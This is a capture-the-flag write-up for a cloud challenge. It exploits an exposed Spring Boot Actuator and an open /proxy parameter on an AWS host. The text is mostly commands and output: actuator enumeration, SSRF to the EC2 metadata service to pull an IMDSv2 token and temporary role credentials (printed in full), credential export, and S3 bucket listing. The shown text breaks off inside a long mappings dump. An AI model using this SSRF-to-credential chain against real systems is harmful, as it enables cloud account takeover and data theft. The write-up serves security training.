

<img width="614" height="340" alt="image" src="https://github.com/user-attachments/assets/7ec8ac58-862c-4139-9a51-f8e79b69c5c2" />

---  


We started by checking the environment variables:  
```
user@monthly-challenge:~$ env
PWD=/home/user
INFO_MSG=You've discovered a Spring Boot Actuator application running on AWS: curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com
HOME=/home/user
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
LESSCLOSE=/usr/bin/lesspipe %s %s
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
SHLVL=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
CHALLENGE_BANNER=
_=/usr/bin/env
```

We run the command in the `INFO_MSG` variable:  
```
user@monthly-challenge:~$ curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com
Welcome to the proxy server.
```


We call the `actuator` endpoint:  
```json
user@monthly-challenge:~$ curl -k -u ctf:88sPVWyC2P3p https://challenge01.cloud-champions.com/actuator
{
  "_links": {
    "self": {
      "href": "http://127.0.0.1:8080/actuator",
      "templated": false
    },
    "beans": {
      "href": "http://127.0.0.1:8080/actuator/beans",
      "templated": false
    },
    "caches": {
      "href": "http://127.0.0.1:8080/actuator/caches",
      "templated": false
    },
    "caches-cache": {
      "href": "http://127.0.0.1:8080/actuator/caches/{cache}",
      "templated": true
    },
    "health": {
      "href": "http://127.0.0.1:8080/actuator/health",
      "templated": false
    },
    "health-path": {
      "href": "http://127.0.0.1:8080/actuator/health/{*path}",
      "templated": true
    },
    "info": {
      "href": "http://127.0.0.1:8080/actuator/info",
      "templated": false
    },
    "conditions": {
      "href": "http://127.0.0.1:8080/actuator/conditions",
      "templated": false
    },
    "configprops": {
      "href": "http://127.0.0.1:8080/actuator/configprops",
      "templated": false
    },
    "configprops-prefix": {
      "href": "http://127.0.0.1:8080/actuator/configprops/{prefix}",
      "templated": true
    },
    "env": {
      "href": "http://127.0.0.1:8080/actuator/env",
      "templated": false
    },
    "env-toMatch": {
      "href": "http://127.0.0.1:8080/actuator/env/{toMatch}",
      "templated": true
    },
    "loggers": {
      "href": "http://127.0.0.1:8080/actuator/loggers",
      "templated": false
    },
    "loggers-name": {
      "href": "http://127.0.0.1:8080/actuator/loggers/{name}",
      "templated": true
    },
    "threaddump": {
      "href": "http://127.0.0.1:8080/actuator/threaddump",
      "templated": false
    },
    "metrics-requiredMetricName": {
      "href": "http://127.0.0.1:8080/actuator/metrics/{requiredMetricName}",
      "templated": true
    },
    "metrics": {
      "href": "http://127.0.0.1:8080/actuator/metrics",
      "templated": false
    },
    "sbom": {
      "href": "http://127.0.0.1:8080/actuator/sbom",
      "templated": false
    },
    "sbom-id": {
      "href": "http://127.0.0.1:8080/actuator/sbom/{id}",
      "templated": true
    },
    "scheduledtasks": {
      "href": "http://127.0.0.1:8080/actuator/scheduledtasks",
      "templated": false
    },
    "mappings": {
      "href": "http://127.0.0.1:8080/actuator/mappings",
      "templated": false
    }
  }
}
```


We call the environments:  
```json
user@monthly-challenge:~$ curl -k -u ctf:88sPVWyC2P3p https://challenge01.cloud-champions.com/actuator/env
{
  "activeProfiles": [],
  "defaultProfiles": [
    "default"
  ],
  "propertySources": [
    {
      "name": "server.ports",
      "properties": {
        "local.server.port": {
          "value": 8080
        }
      }
    },
    {
      "name": "servletContextInitParams",
      "properties": {}
    },
    {
      "name": "systemProperties",
      "properties": {
        "java.specification.version": {
          "value": "24"
        },
        "sun.jnu.encoding": {
          "value": "UTF-8"
        },
        "java.class.path": {
          "value": "/home/ec2-user/spring-boot/target/spring-boot-0.0.1-SNAPSHOT.jar"
        },
        "java.vm.vendor": {
          "value": "Amazon.com Inc."
        },
        "sun.arch.data.model": {
          "value": "64"
        },
        "java.vendor.url": {
          "value": "https://aws.amazon.com/corretto/"
        },
        "catalina.useNaming": {
          "value": "false"
        },
        "user.timezone": {
          "value": "UTC"
        },
        "java.vm.specification.version": {
          "value": "24"
        },
        "os.name": {
          "value": "Linux"
        },
        "APPLICATION_NAME": {
          "value": "spring"
        },
        "sun.java.launcher": {
          "value": "SUN_STANDARD"
        },
        "sun.boot.library.path": {
          "value": "/usr/lib/jvm/java-24-amazon-corretto.x86_64/lib"
        },
        "sun.java.command": {
          "value": "/home/ec2-user/spring-boot/target/spring-boot-0.0.1-SNAPSHOT.jar"
        },
        "jdk.debug": {
          "value": "release"
        },
        "sun.cpu.endian": {
          "value": "little"
        },
        "user.home": {
          "value": "/home/ec2-user"
        },
        "user.language": {
          "value": "en"
        },
        "java.specification.vendor": {
          "value": "Oracle Corporation"
        },
        "java.version.date": {
          "value": "2025-04-15"
        },
        "java.home": {
          "value": "/usr/lib/jvm/java-24-amazon-corretto.x86_64"
        },
        "file.separator": {
          "value": "/"
        },
        "java.vm.compressedOopsMode": {
          "value": "32-bit"
        },
        "line.separator": {
          "value": "\n"
        },
        "java.vm.specification.vendor": {
          "value": "Oracle Corporation"
        },
        "java.specification.name": {
          "value": "Java Platform API Specification"
        },
        "FILE_LOG_CHARSET": {
          "value": "UTF-8"
        },
        "java.awt.headless": {
          "value": "true"
        },
        "java.protocol.handler.pkgs": {
          "value": "org.springframework.boot.loader.net.protocol"
        },
        "sun.management.compiler": {
          "value": "HotSpot 64-Bit Tiered Compilers"
        },
        "java.runtime.version": {
          "value": "24.0.1+9-FR"
        },
        "user.name": {
          "value": "ec2-user"
        },
        "stdout.encoding": {
          "value": "UTF-8"
        },
        "path.separator": {
          "value": ":"
        },
        "os.version": {
          "value": "6.1.134-152.225.amzn2023.x86_64"
        },
        "java.runtime.name": {
          "value": "OpenJDK Runtime Environment"
        },
        "file.encoding": {
          "value": "UTF-8"
        },
        "java.vm.name": {
          "value": "OpenJDK 64-Bit Server VM"
        },
        "java.vendor.version": {
          "value": "Corretto-24.0.1.9.1"
        },
        "java.vendor.url.bug": {
          "value": "https://github.com/corretto/corretto-24/issues/"
        },
        "java.io.tmpdir": {
          "value": "/tmp"
        },
        "catalina.home": {
          "value": "/tmp/tomcat.8080.13055312974992882027"
        },
        "java.version": {
          "value": "24.0.1"
        },
        "user.dir": {
          "value": "/home/ec2-user/spring-boot"
        },
        "os.arch": {
          "value": "amd64"
        },
        "java.vm.specification.name": {
          "value": "Java Virtual Machine Specification"
        },
        "PID": {
          "value": "1498"
        },
        "CONSOLE_LOG_CHARSET": {
          "value": "UTF-8"
        },
        "catalina.base": {
          "value": "/tmp/tomcat.8080.13055312974992882027"
        },
        "native.encoding": {
          "value": "UTF-8"
        },
        "java.library.path": {
          "value": "/usr/java/packages/lib:/usr/lib64:/lib64:/lib:/usr/lib"
        },
        "java.vm.info": {
          "value": "mixed mode, sharing"
        },
        "stderr.encoding": {
          "value": "UTF-8"
        },
        "java.vendor": {
          "value": "Amazon.com Inc."
        },
        "java.vm.version": {
          "value": "24.0.1+9-FR"
        },
        "sun.io.unicode.encoding": {
          "value": "UnicodeLittle"
        },
        "java.class.version": {
          "value": "68.0"
        },
        "LOGGED_APPLICATION_NAME": {
          "value": "[spring] "
        }
      }
    },
    {
      "name": "systemEnvironment",
      "properties": {
        "INVOCATION_ID": {
          "value": "4129fa7827964c699f36a92806607fc4",
          "origin": "System Environment Property \"INVOCATION_ID\""
        },
        "HOME": {
          "value": "/home/ec2-user",
          "origin": "System Environment Property \"HOME\""
        },
        "PATH": {
          "value": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin",
          "origin": "System Environment Property \"PATH\""
        },
        "SHELL": {
          "value": "/bin/bash",
          "origin": "System Environment Property \"SHELL\""
        },
        "BUCKET": {
          "value": "challenge01-470f711",
          "origin": "System Environment Property \"BUCKET\""
        },
        "LOGNAME": {
          "value": "ec2-user",
          "origin": "System Environment Property \"LOGNAME\""
        },
        "USER": {
          "value": "ec2-user",
          "origin": "System Environment Property \"USER\""
        },
        "SYSTEMD_EXEC_PID": {
          "value": "1498",
          "origin": "System Environment Property \"SYSTEMD_EXEC_PID\""
        },
        "LANG": {
          "value": "C.UTF-8",
          "origin": "System Environment Property \"LANG\""
        },
        "JOURNAL_STREAM": {
          "value": "8:16030",
          "origin": "System Environment Property \"JOURNAL_STREAM\""
        }
      }
    },
    {
      "name": "Config resource 'class path resource [application.properties]' via location 'optional:classpath:/'",
      "properties": {
        "spring.application.name": {
          "value": "spring",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 1:25"
        },
        "management.endpoints.web.exposure.include": {
          "value": "*",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 2:43"
        },
        "management.endpoints.web.expose": {
          "value": "*",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 3:33"
        },
        "management.endpoint.env.show-values": {
          "value": "always",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 4:37"
        },
        "server.error.include-message": {
          "value": "always",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 5:30"
        }
      }
    },
    {
      "name": "applicationInfo",
      "properties": {
        "spring.application.version": {
          "value": "0.0.1-SNAPSHOT"
        },
        "spring.application.pid": {
          "value": 1498
        }
      }
    }
  ]
}
```


We have the bucket name:  
```
"BUCKET":{"value":"challenge01-470f711"}
```


# Get IMDSv2 token via /proxy

From our challenge box we run:
```
user@monthly-challenge:~$ TOKEN=$(curl -sk -u ctf:88sPVWyC2P3p \
  -X PUT \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token")

AQAEAOgqA-jOT_cWmVsN0tqX0kidw54CUqlDFtoLM4sy9OgLb3YedA==
```

# Get the instance role name

We will use the token:  
```
user@monthly-challenge:~$ ROLE=$(curl -sk -u ctf:88sPVWyC2P3p \
  -H "X-aws-ec2-metadata-token: $TOKEN" \
  "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/")

echo "$ROLE"

challenge01-5592368
```

# Get temporary credentials for that role
```
user@monthly-challenge:~$ curl -sk -u ctf:88sPVWyC2P3p \
  -H "X-aws-ec2-metadata-token: $TOKEN" \
  "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"

{
  "Code" : "Success",
  "LastUpdated" : "2025-11-19T16:46:13Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIARK7LBOHXFKGJ2EIF",
  "SecretAccessKey" : "jDGxZp4S3IMoX9+V06vLMKbWWd8TRIh5fDOMzunh",
  "Token" : "IQoJb3JpZ2luX2VjEBkaCXVzLWVhc3QtMSJIMEYCIQDiWNCn//fG3NGT/7g488EkYZ37uL4/NHaTHjY4oWaZJAIhAK77LaOJlOO902BRhVNI0rT9zt07T89+ypRCX/Qq6TYIKsEFCOL//////////wEQABoMMDkyMjk3ODUxMzc0IgzqF/zwCVymNbi1roYqlQVJSnSKqDtEj0opvh3tCNiKDt0RtZoSjHWL4sbsOADV+FyerK9D17BA9G5s8Gf35RUEuDEJntN9Fd7DJ531Uj9N4rI3EX+1ZMRx/7UaoyjjxZvDTOzHeobxl92eKkXKm8WclY7EEfIr8tTZ3wTdk4/FDyJ9MSGuh4OTxEsFLKQK2OxW6NoNpfqY/dRHCyKUvppOQBpNI0TDO0KF7+6rMH1GIzFQsDbrmfa6xy8tTM5COKoGITE+TpSoz+l/z5UQpu7LYL/Ro7BmJWRxEWjnA5nEvBUtYEEmGD01QRwaRDXWx1VQe38Aw7x0fLb2TsNjLDmM/RS3sXLzdkiq3Pq28mwvrwO4NSjCYP3PgQ9i44RWY+ELY0/nc0xnVBUA0QmUojclvI78RIkgJnankDU336QyCkXsy24Un7oYsW5FJDON75WXTy278aGxKdEa4gL8EUJa+ml8eM/rOQmVfZsbYmLSd+uZpCSfnjsmd5jv7dBx28JoftlktJZlFD29RB5SDawn8zaywzL+NFVHwVfPZ1+gQtHYKgw+E9RxSKC5zV0HiMKWRhv9TlUlkxjROVHB5OaRO3rcl3/sw6XFWyU7X0e5PpaSY8Qd+9wlFw/dyuWIs6mBEY/Xk24awiLLW30tI/6MSLegq6RGDcQbZ8LdVJBzaV4qOFfJbJb56Rlld1yx6a5IvNaYkIlK9uDrY+rP3J4RK7HN65ludzCIc+I5utilvcNsUrRbhYlAwAI30w4NSyZuz1x72QXBtXiCfadTJNjE4mwrHB6cLi4MInAsU1YAn3FNY7DNAqOD2E/kxkcqeWIooyJvyeFUsIArg4pUat4O++TTSXbLEGjFwSjyy0EIxRDD+HRNPd4Q8WhuEbbwe4Rqu3vgMKbo98gGOrABZa7sbkZchxAmptgU5CqxmXH60i/8RDQs1mOK+qFHoe2JcGjIY2ujMz7FqeISJeqNj8DCh9m/lv3h0iv1DN8oqwUDqsPi1/5jPrSjAIKwkuOFNMva31Nb/xfsvSgLz2REcoQMGL+a+8Baebf9F7bPlJjZlZ2hAXLRC5oUWQJ5E/i9RBKyaeT+JA5k9Om8/nQUgWKc/iWTKFW8EClP9B1SikisJR1QnqwHXTFuPVsRZ/Q=",
  "Expiration" : "2025-11-19T22:46:07Z"
}
```

We save it:  
```
cat > creds.json << 'EOF'
{
  "Code" : "Success",
  "LastUpdated" : "2025-11-19T16:46:13Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIARK7LBOHXFKGJ2EIF",
  "SecretAccessKey" : "jDGxZp4S3IMoX9+V06vLMKbWWd8TRIh5fDOMzunh",
  "Token" : "IQoJb3JpZ2luX2VjEBkaCXVzLWVhc3QtMSJIMEYCIQDiWNCn//fG3NGT/7g488EkYZ37uL4/NHaTHjY4oWaZJAIhAK77LaOJlOO902BRhVNI0rT9zt07T89+ypRCX/Qq6TYIKsEFCOL//////////wEQABoMMDkyMjk3ODUxMzc0IgzqF/zwCVymNbi1roYqlQVJSnSKqDtEj0opvh3tCNiKDt0RtZoSjHWL4sbsOADV+FyerK9D17BA9G5s8Gf35RUEuDEJntN9Fd7DJ531Uj9N4rI3EX+1ZMRx/7UaoyjjxZvDTOzHeobxl92eKkXKm8WclY7EEfIr8tTZ3wTdk4/FDyJ9MSGuh4OTxEsFLKQK2OxW6NoNpfqY/dRHCyKUvppOQBpNI0TDO0KF7+6rMH1GIzFQsDbrmfa6xy8tTM5COKoGITE+TpSoz+l/z5UQpu7LYL/Ro7BmJWRxEWjnA5nEvBUtYEEmGD01QRwaRDXWx1VQe38Aw7x0fLb2TsNjLDmM/RS3sXLzdkiq3Pq28mwvrwO4NSjCYP3PgQ9i44RWY+ELY0/nc0xnVBUA0QmUojclvI78RIkgJnankDU336QyCkXsy24Un7oYsW5FJDON75WXTy278aGxKdEa4gL8EUJa+ml8eM/rOQmVfZsbYmLSd+uZpCSfnjsmd5jv7dBx28JoftlktJZlFD29RB5SDawn8zaywzL+NFVHwVfPZ1+gQtHYKgw+E9RxSKC5zV0HiMKWRhv9TlUlkxjROVHB5OaRO3rcl3/sw6XFWyU7X0e5PpaSY8Qd+9wlFw/dyuWIs6mBEY/Xk24awiLLW30tI/6MSLegq6RGDcQbZ8LdVJBzaV4qOFfJbJb56Rlld1yx6a5IvNaYkIlK9uDrY+rP3J4RK7HN65ludzCIc+I5utilvcNsUrRbhYlAwAI30w4NSyZuz1x72QXBtXiCfadTJNjE4mwrHB6cLi4MInAsU1YAn3FNY7DNAqOD2E/kxkcqeWIooyJvyeFUsIArg4pUat4O++TTSXbLEGjFwSjyy0EIxRDD+HRNPd4Q8WhuEbbwe4Rqu3vgMKbo98gGOrABZa7sbkZchxAmptgU5CqxmXH60i/8RDQs1mOK+qFHoe2JcGjIY2ujMz7FqeISJeqNj8DCh9m/lv3h0iv1DN8oqwUDqsPi1/5jPrSjAIKwkuOFNMva31Nb/xfsvSgLz2REcoQMGL+a+8Baebf9F7bPlJjZlZ2hAXLRC5oUWQJ5E/i9RBKyaeT+JA5k9Om8/nQUgWKc/iWTKFW8EClP9B1SikisJR1QnqwHXTFuPVsRZ/Q=",
  "Expiration" : "2025-11-19T22:46:07Z"
}
EOF
```

Export the credentials:  
```
jq -r '
  "export AWS_ACCESS_KEY_ID=\(.AccessKeyId)",
  "export AWS_SECRET_ACCESS_KEY=\(.SecretAccessKey)",
  "export AWS_SESSION_TOKEN=\(.Token)"
' creds.json > aws_env.sh

# Optionally set region too (if you know it), e.g.:
echo 'export AWS_DEFAULT_REGION=us-east-1' >> aws_env.sh

source aws_env.sh

```

Verify:
```
env | grep ^AWS_
```


```
user@monthly-challenge:~$ aws sts get-caller-identity
aws s3 ls s3://challenge01-470f711
{
    "UserId": "AROARK7LBOHXDP2J2E3DV:i-0bfc4291dd0acd279",
    "Account": "092297851374",
    "Arn": "arn:aws:sts::092297851374:assumed-role/challenge01-5592368/i-0bfc4291dd0acd279"
}
                           PRE private/
2025-06-18 17:15:24         29 hello.txt
```

We then check the private folder:  
```
user@monthly-challenge:~$ aws s3 ls s3://challenge01-470f711/private/
2025-06-16 22:01:49         51 flag.txt
```




We call the mappings:  
```json
user@monthly-challenge:~$ curl -k -u ctf:88sPVWyC2P3p https://challenge01.cloud-champions.com/actuator/mappings     
{
  "contexts": {
    "spring": {
      "mappings": {
        "dispatcherServlets": {
          "dispatcherServlet": [
            {
              "predicate": "{GET [/actuator/configprops], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'configprops'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/configprops"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/scheduledtasks], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'scheduledtasks'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/scheduledtasks"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/metrics/{requiredMetricName}], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'metrics-requiredMetricName'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/metrics/{requiredMetricName}"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/caches], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'caches'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/caches"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/env/{toMatch}], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'env-toMatch'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/env/{toMatch}"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator root web endpoint",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.WebMvcEndpointHandlerMapping.WebMvcLinksHandler",
                  "name": "links",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljakarta/servlet/http/HttpServletResponse;)Ljava/util/Map;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/sbom/{id}], produces [application/octet-stream]}",
              "handler": "Actuator web endpoint 'sbom-id'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/sbom/{id}"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/octet-stream",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/beans], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'beans'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/beans"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{DELETE [/actuator/caches/{cache}], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'caches-cache'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "DELETE"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/caches/{cache}"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/threaddump], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'threaddump'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/threaddump"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/configprops/{prefix}], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'configprops-prefix'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/configprops/{prefix}"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
